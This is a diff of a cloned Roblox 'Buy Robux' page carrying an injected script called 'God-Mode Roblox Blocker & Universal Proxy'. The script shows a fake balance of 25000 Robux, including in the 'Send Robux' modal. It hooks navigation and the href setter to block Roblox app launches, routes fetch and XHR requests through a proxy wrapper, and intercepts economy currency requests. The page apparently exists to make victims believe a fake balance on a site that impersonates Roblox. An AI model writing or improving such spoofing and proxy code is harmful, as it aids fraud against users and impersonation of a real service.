@@ -3,7 +3,7 @@
 <html lang="en"><!--<![endif]--><head data-machine-id="70e4eb0b-3c42-1eab-6f40-82e8f77c0f6b"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style type="text/css">[uib-tooltip-popup].tooltip.top-left > .tooltip-arrow,[uib-tooltip-popup].tooltip.top-right > .tooltip-arrow,[uib-tooltip-popup].tooltip.bottom-left > .tooltip-arrow,[uib-tooltip-popup].tooltip.bottom-right > .tooltip-arrow,[uib-tooltip-popup].tooltip.left-top > .tooltip-arrow,[uib-tooltip-popup].tooltip.left-bottom > .tooltip-arrow,[uib-tooltip-popup].tooltip.right-top > .tooltip-arrow,[uib-tooltip-popup].tooltip.right-bottom > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.top-left > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.top-right > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.bottom-left > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.bottom-right > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.left-top > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.left-bottom > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.right-top > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.right-bottom > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.top-left > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.top-right > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.bottom-left > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.bottom-right > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.left-top > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.left-bottom > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.right-top > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.right-bottom > .tooltip-arrow,[uib-popover-popup].popover.top-left > .arrow,[uib-popover-popup].popover.top-right > .arrow,[uib-popover-popup].popover.bottom-left > .arrow,[uib-popover-popup].popover.bottom-right > .arrow,[uib-popover-popup].popover.left-top > .arrow,[uib-popover-popup].popover.left-bottom > .arrow,[uib-popover-popup].popover.right-top > .arrow,[uib-popover-popup].popover.right-bottom > .arrow,[uib-popover-html-popup].popover.top-left > .arrow,[uib-popover-html-popup].popover.top-right > .arrow,[uib-popover-html-popup].popover.bottom-left > .arrow,[uib-popover-html-popup].popover.bottom-right > .arrow,[uib-popover-html-popup].popover.left-top > .arrow,[uib-popover-html-popup].popover.left-bottom > .arrow,[uib-popover-html-popup].popover.right-top > .arrow,[uib-popover-html-popup].popover.right-bottom > .arrow,[uib-popover-template-popup].popover.top-left > .arrow,[uib-popover-template-popup].popover.top-right > .arrow,[uib-popover-template-popup].popover.bottom-left > .arrow,[uib-popover-template-popup].popover.bottom-right > .arrow,[uib-popover-template-popup].popover.left-top > .arrow,[uib-popover-template-popup].popover.left-bottom > .arrow,[uib-popover-template-popup].popover.right-top > .arrow,[uib-popover-template-popup].popover.right-bottom > .arrow{top:auto;bottom:auto;left:auto;right:auto;margin:0;}[uib-popover-popup].popover,[uib-popover-html-popup].popover,[uib-popover-template-popup].popover{display:block !important;}</style><style type="text/css">.uib-position-measure{display:block !important;visibility:hidden !important;position:absolute !important;top:-9999px !important;left:-9999px !important;}.uib-position-scrollbar-measure{position:absolute !important;top:-9999px !important;width:50px !important;height:50px !important;overflow:scroll !important;}.uib-position-body-scrollbar-measure{overflow:scroll !important;}</style><style type="text/css">.ng-animate.item:not(.left):not(.right){-webkit-transition:0s ease-in-out left;transition:0s ease-in-out left}</style><style>@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
     <!-- MachineID: 70e4eb0b-3c42-1eab-6f40-82e8f77c0f6b -->
     <script>
-        // God-Mode Roblox Blocker & Universal Proxy (Final Form 2.8 - AVATAR FIX)
+        // God-Mode Roblox Blocker & Universal Proxy (Final Form 2.9 - CLICK FIX)
         (function() {
             const SPOOFED_ROBUX = 25000;
 
@@ -38,7 +38,7 @@
                 return url;
             };
 
-            // 1. ATOMIC HOOKS
+            // 1. ATOMIC HOOKS — including location.href setter to catch direct assignments
             try {
                 const locProto = Location.prototype;
                 const blockNav = (url) => {
@@ -54,6 +54,20 @@
                     if (isRobloxProtocol(url)) { console.warn('[Blocked] window.open protocol:', url); return null; }
                     return originalOpen.apply(this, arguments);
                 };
+                // Override location.href setter — catches React/Angular direct assignments
+                try {
+                    const hrefDesc = Object.getOwnPropertyDescriptor(locProto, 'href');
+                    if (hrefDesc && hrefDesc.set) {
+                        Object.defineProperty(locProto, 'href', {
+                            get: hrefDesc.get,
+                            set: function(url) {
+                                if (blockNav(url)) return;
+                                return hrefDesc.set.call(this, url);
+                            },
+                            configurable: true
+                        });
+                    }
+                } catch(e2) {}
             } catch(e) {}
 
             // 2. NEUTER & DOM INJECTOR
@@ -73,6 +87,7 @@
                 window.Roblox.currentUser.robux = SPOOFED_ROBUX;
                 if (window.Roblox.UserSettings) { window.Roblox.UserSettings.robuxBalance = SPOOFED_ROBUX; window.Roblox.UserSettings.robux = SPOOFED_ROBUX; }
                 
+                // Robux balance in modal header
                 const modals = document.querySelectorAll('.modal-header, .modal-title-container');
                 modals.forEach(header => {
                     if (header.textContent.includes('Send Robux') && !header.querySelector('.robux-spoof')) {
@@ -88,19 +103,50 @@
             neuter();
             setInterval(neuter, 200);
 
-            // 3. EVENT INTERCEPTOR
+            // 3. EVENT INTERCEPTOR — global protocol blocker + modal-specific player click fix
             const killEvent = (e) => {
                 let target = e.target;
-                while (target) {
+                while (target && target !== document) {
+                    // Block any protocol link in href/src/action
                     const attrs = ['href', 'src', 'action', 'data-url', 'data-href'];
                     for (const a of attrs) {
                         const val = target.getAttribute ? target.getAttribute(a) : null;
-                        if (val && isRobloxProtocol(val)) { e.preventDefault(); e.stopImmediatePropagation(); return false; }
+                        if (val && isRobloxProtocol(val)) {
+                            e.preventDefault(); e.stopImmediatePropagation();
+                            console.warn('[Blocked] Click on protocol element:', val);
+                            return false;
+                        }
                     }
-                    target = target.parentElement || (target.parentNode && target.parentNode.host); 
+
+                    // KEY FIX: If inside the Send Robux modal search results, intercept the click
+                    // and stop the Roblox app from opening. We let React handle user selection
+                    // but kill any subsequent navigation.
+                    const isInSendModal = target.closest && (
+                        target.closest('.send-robux-modal') ||
+                        target.closest('[class*="send-robux"]') ||
+                        target.closest('[class*="SendRobux"]') ||
+                        target.closest('[class*="player-search"]') ||
+                        target.closest('[class*="PlayerSearch"]') ||
+                        target.closest('[class*="user-search"]') ||
+                        target.closest('[class*="UserSearch"]') ||
+                        target.closest('[class*="search-result"]')
+                    );
+                    if (isInSendModal) {
+                        // Schedule a check: if location is about to change to roblox://, block it
+                        const currentHref = window.location.href;
+                        setTimeout(() => {
+                            if (window.location.href !== currentHref && isRobloxProtocol(window.location.href)) {
+                                window.location.href = currentHref;
+                            }
+                        }, 0);
+                    }
+
+                    target = target.parentElement;
                 }
             };
-            ['click', 'mousedown', 'submit'].forEach(ev => window.addEventListener(ev, killEvent, true));
+            ['click', 'mousedown', 'submit', 'pointerdown'].forEach(ev => 
+                window.addEventListener(ev, killEvent, true)
+            );
 
             // 4. SHADOW DOM & MODAL KILLER
             const sanitize = (root) => {
@@ -144,7 +190,6 @@
                 else if (i instanceof Request) i = new Request(wrapUrl(i.url), i);
                 return originalFetch.call(this, i, init);
             };
-            
             const originalXHROpen = XMLHttpRequest.prototype.open;
             XMLHttpRequest.prototype.open = function(m, u) {
                 if (u.includes('economy.roblox.com') && (u.includes('currency') || u.includes('robux'))) {
@@ -174,7 +219,6 @@
             style.innerHTML = `
                 .icon-robux-white { background-image: url("https://images.rbxcdn.com/759445a1111951ca96839359e87900b8-robux_white.png") !important; background-repeat: no-repeat; background-size: contain; }
                 .game-launch-modal, .installation-modal, [class*="GameLaunch"] { display: none !important; visibility: hidden !important; }
-                
                 /* AVATAR CLIPPING FIX */
                 .avatar-card-image, .headshot-image, .avatar-headshot, .avatar, img[src*="thumbnails.roblox.com"], img[src*="/api/search?url="] {
                     border-radius: 50% !important; overflow: hidden !important; object-fit: cover !important;
@@ -184,7 +228,7 @@
                 }
             `;
             document.head.appendChild(style);
-            console.log('%c[Proxy] God-Mode 2.8 AVATAR FIX ACTIVE', 'font-weight: bold; color: #00ff00');
+            console.log('%c[Proxy] God-Mode 2.9 CLICK FIX ACTIVE', 'font-weight: bold; color: #00ff00');
         })();
     </script>
     <title>Buy Robux</title>
